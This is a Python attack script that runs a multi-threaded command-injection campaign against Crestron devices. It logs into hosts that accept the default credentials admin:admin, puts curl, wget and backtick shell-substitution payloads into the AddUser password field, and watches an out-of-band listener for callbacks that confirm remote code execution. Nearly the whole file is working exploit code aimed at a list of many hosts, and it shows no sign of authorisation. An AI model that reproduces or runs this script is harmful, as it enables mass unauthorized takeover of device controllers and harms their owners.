#!/usr/bin/env python3
"""
[REDACTED-ID]_006: addSSLUserPassword() OOB Command Injection — Multi-threaded Campaign
Tests ADDUSER password injection with OOB callback against all default-cred hosts.
Uses ThreadPoolExecutor for parallel execution.
"""
import requests
import json
import time
import sys
import urllib3
import base64
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OOB_HOST = "[REDACTED-IP]"
OOB_PORT = 80
TIMEOUT = 40  # ADDUSER times out at ~30.2s, give a little buffer
MAX_WORKERS = 15  # Concurrent threads
RESULTS_FILE = "/tmp/cf4_006_injection_results.log"

HOSTS_FILE = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-PROJECT]/[REDACTED-ID]_Crestron_FW3x/scripts/DefaultCredsAll.txt"

log_lock = threading.Lock()
stats = {"tested": 0, "timeouts": 0, "errors": 0, "dispatched": 0}
stats_lock = threading.Lock()

def get_hosts():
    hosts = []
    with open(HOSTS_FILE) as f:
        for line in f:
            line = line.strip()
            if not line or "admin:admin" not in line:
                continue
            if "DOCTYPE" in line or "<html" in line or "recaptcha" in line:
                continue
            ip = line.split("|")[0].strip()
            hosts.append(ip)
    return hosts

def log_result(msg):
    with log_lock:
        print(msg, flush=True)
        with open(RESULTS_FILE, "a") as f:
            f.write(msg + "\n")

def try_injection(host, username, password, creds="admin:admin"):
    url = f"https://{host}/Device"
    auth_user, auth_pass = creds.split(":")
    body = {
        "Device": {
            "Authentication": {
                "AddUser": {
                    "UserName": username,
                    "Password": password
                }
            }
        }
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Basic " + base64.b64encode(f"{auth_user}:{auth_pass}".encode()).decode()
    }
    try:
        start = time.time()
        resp = requests.post(url, json=body, headers=headers, verify=False, timeout=TIMEOUT)
        elapsed = time.time() - start
        return {"status_code": resp.status_code, "elapsed": round(elapsed, 2),
                "body": resp.text[:500], "error": None}
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        return {"status_code": None, "elapsed": round(elapsed, 2),
                "body": None, "error": "TIMEOUT"}
    except requests.exceptions.ConnectionError as e:
        return {"status_code": None, "elapsed": 0,
                "body": None, "error": f"CONN_ERR: {str(e)[:80]}"}
    except Exception as e:
        return {"status_code": None, "elapsed": 0,
                "body": None, "error": f"ERR: {str(e)[:80]}"}

def test_host(host, host_idx, total):
    """Test a single host with all 3 payload variants"""
    tag = hashlib.md5(host.encode()).hexdigest()[:8]
    username = f"cf4t{tag[:4]}"

    payloads = [
        ("curl", f"test'$(curl http://{OOB_HOST}:{OOB_PORT}/cf4006/{tag}/{host})'"),
        ("wget", f"test'$(wget -qO- http://{OOB_HOST}:{OOB_PORT}/cf4006w/{tag}/{host})'"),
        ("btck", f"test'`curl http://{OOB_HOST}:{OOB_PORT}/cf4006b/{tag}/{host}`'"),
    ]

    results = []
    for pname, password in payloads:
        result = try_injection(host, username, password)

        with stats_lock:
            stats["tested"] += 1
            if result["error"] == "TIMEOUT":
                stats["timeouts"] += 1
            elif result["error"]:
                stats["errors"] += 1

        elapsed = result["elapsed"]
        if result["error"] == "TIMEOUT":
            log_result(f"  [{host_idx}/{total}] {host} [{pname}] TIMEOUT {elapsed}s — CTP dispatched")
            with stats_lock:
                stats["dispatched"] += 1
        elif result["error"]:
            log_result(f"  [{host_idx}/{total}] {host} [{pname}] {result['error']}")
            if "CONN_ERR" in str(result["error"]):
                break  # Skip remaining payloads for unreachable host
        else:
            status = result["status_code"]
            body = (result["body"] or "")[:150]

            if elapsed > 25:
                log_result(f"  [{host_idx}/{total}] {host} [{pname}] HTTP {status} {elapsed}s — CTP DISPATCHED (long response)")
                with stats_lock:
                    stats["dispatched"] += 1
            elif elapsed < 3:
                log_result(f"  [{host_idx}/{total}] {host} [{pname}] HTTP {status} {elapsed}s — quick (may not have reached CTP)")
            else:
                log_result(f"  [{host_idx}/{total}] {host} [{pname}] HTTP {status} {elapsed}s")

            if "StatusId" in body:
                # Extract StatusId
                try:
                    j = json.loads(result["body"])
                    for action in j.get("Actions", []):
                        for r in action.get("Results", []):
                            sid = r.get("StatusId")
                            sinfo = r.get("StatusInfo", "")
                            log_result(f"           StatusId={sid}: {sinfo}")
                except:
                    pass

        results.append(result)
        time.sleep(0.2)  # Small delay between payloads to same host

    return host, results

def main():
    # Clear previous results
    with open(RESULTS_FILE, "w") as f:
        pass

    hosts = get_hosts()
    total = len(hosts)

    log_result(f"[*] [REDACTED-ID]_006 OOB Injection Campaign (THREADED)")
    log_result(f"[*] OOB Listener: http://{OOB_HOST}:{OOB_PORT}")
    log_result(f"[*] Targets: {total} hosts × 3 payloads = {total*3} requests")
    log_result(f"[*] Workers: {MAX_WORKERS} concurrent threads")
    log_result(f"[*] Timeout: {TIMEOUT}s per request")
    log_result(f"[*] Monitor OOB: tail -f /tmp/cf4_oob_listener.log")
    log_result(f"[*] Started: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
    log_result("=" * 80)

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {}
        for i, host in enumerate(hosts):
            future = executor.submit(test_host, host, i+1, total)
            futures[future] = host

        for future in as_completed(futures):
            host = futures[future]
            try:
                future.result()
            except Exception as e:
                log_result(f"  [!] Exception testing {host}: {e}")

    elapsed_total = time.time() - start_time

    log_result("\n" + "=" * 80)
    log_result(f"[*] Campaign complete in {elapsed_total:.1f}s")
    log_result(f"[*] Requests: {stats['tested']} total, {stats['dispatched']} CTP dispatched, {stats['timeouts']} timeouts, {stats['errors']} errors")
    log_result(f"[*] CHECK OOB LOG NOW: tail -f /tmp/cf4_oob_listener.log")
    log_result(f"[*] Any callback from a Crestron IP = CONFIRMED RCE")
    log_result(f"[*] Finished: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")

    # Also check the OOB log right now
    log_result("\n[*] Waiting 30s for any delayed OOB callbacks...")
    time.sleep(30)

    # Final OOB check
    import subprocess
    try:
        oob_check = subprocess.run(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
             "-i", "/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-KEY]",
             "ubuntu@[REDACTED-IP]", "cat /tmp/oob_listener.log"],
            capture_output=True, text=True, timeout=15
        )
        log_result("\n[*] === FINAL OOB LISTENER LOG ===")
        for line in oob_check.stdout.strip().split("\n"):
            log_result(f"  {line}")
    except Exception as e:
        log_result(f"[!] Could not check OOB log: {e}")

if __name__ == "__main__":
    main()
